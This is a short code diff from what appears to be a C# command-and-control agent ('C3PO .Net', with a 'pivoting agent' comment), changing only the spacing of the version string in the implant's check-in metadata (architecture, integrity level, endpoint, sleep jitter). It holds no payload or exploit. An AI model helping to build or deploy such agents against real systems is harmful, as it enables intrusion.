@@ -176,7 +176,7 @@ namespace EntryPoint
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "C3PO .Net" + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
+                Version = "C3PO .Net" + " " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
